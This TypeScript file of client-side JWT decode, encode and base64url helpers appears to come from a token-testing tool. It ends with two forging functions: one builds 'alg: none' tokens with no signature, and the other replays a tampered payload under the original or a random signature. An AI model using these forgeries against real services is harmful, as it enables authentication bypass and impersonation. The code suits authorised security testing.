// JWT encode/decode/sign helpers - pure client-side, no network calls

function normalizeBase64Url(str: string): string {
  const padded = str.replace(/-/g, "+").replace(/_/g, "/");
  const pad = padded.length % 4;
  return pad ? padded + "=".repeat(4 - pad) : padded;
}

export interface JwtParts {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
  raw: { header: string; payload: string; signature: string };
}

export function decodeJwt(token: string): JwtParts {
  const parts = token.trim().split(".");
  if (parts.length !== 3) throw new Error("Invalid JWT: expected 3 parts separated by dots");

  const [rawHeader, rawPayload, rawSig] = parts;

  const header = JSON.parse(base64UrlDecode(rawHeader));
  const payload = JSON.parse(base64UrlDecode(rawPayload));

  return {
    header,
    payload,
    signature: rawSig,
    raw: { header: rawHeader, payload: rawPayload, signature: rawSig },
  };
}

export function encodeJwt(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  signature = ""
): string {
  const h = base64UrlEncode(JSON.stringify(header));
  const p = base64UrlEncode(JSON.stringify(payload));
  return `${h}.${p}.${signature}`;
}

export function base64UrlDecode(str: string): string {
  const paddedStr = normalizeBase64Url(str);
  try {
    return decodeURIComponent(
      atob(paddedStr)
        .split("")
        .map((c) => "%" + c.charCodeAt(0).toString(16).padStart(2, "0"))
        .join("")
    );
  } catch {
    return atob(paddedStr);
  }
}

export function base64UrlDecodeBytes(str: string): Uint8Array {
  const binary = atob(normalizeBase64Url(str));
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

export function base64UrlEncode(str: string): string {
  return btoa(
    encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) =>
      String.fromCharCode(parseInt(p1, 16))
    )
  )
    .replace(/=/g, "")
    .replace(/\+/g, "-")
    .replace(/\//g, "_");
}

export function base64UrlEncodeBytes(bytes: Uint8Array): string {
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

export function isExpired(payload: Record<string, unknown>): boolean {
  if (typeof payload.exp !== "number") return false;
  return payload.exp * 1000 < Date.now();
}

export function formatTimestamp(ts: unknown): string {
  if (typeof ts !== "number") return String(ts);
  return new Date(ts * 1000).toLocaleString();
}

export const STANDARD_CLAIMS = ["iss", "sub", "aud", "exp", "nbf", "iat", "jti"] as const;

// Forge a JWT with alg: none variants
export function forgeAlgNone(
  header: Record<string, unknown>,
  payload: Record<string, unknown>
): Array<{ variant: string; token: string }> {
  const variants = ["none", "None", "NONE", "nOnE"];
  return variants.map((alg) => {
    const h = { ...header, alg };
    const token = encodeJwt(h, payload, "");
    return { variant: alg, token };
  });
}

// Strip signature from a JWT (unverified signature attack)
export function forgeUnverified(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  originalSig: string,
  useRandom: boolean
): string {
  const sig = useRandom ? generateRandomBase64Url(32) : originalSig;
  return encodeJwt(header, payload, sig);
}

function generateRandomBase64Url(bytes: number): string {
  const arr = new Uint8Array(bytes);
  crypto.getRandomValues(arr);
  return base64UrlEncodeBytes(arr);
}

export function hexToBytes(hex: string): Uint8Array {
  const clean = hex.replace(/\s+/g, "").toLowerCase();
  if (clean.length % 2 !== 0) throw new Error("Hex string must have even length");
  if (!/^[0-9a-f]*$/.test(clean)) throw new Error("Invalid hex string");
  const bytes = new Uint8Array(clean.length / 2);
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = parseInt(clean.slice(i * 2, i * 2 + 2), 16);
  }
  return bytes;
}
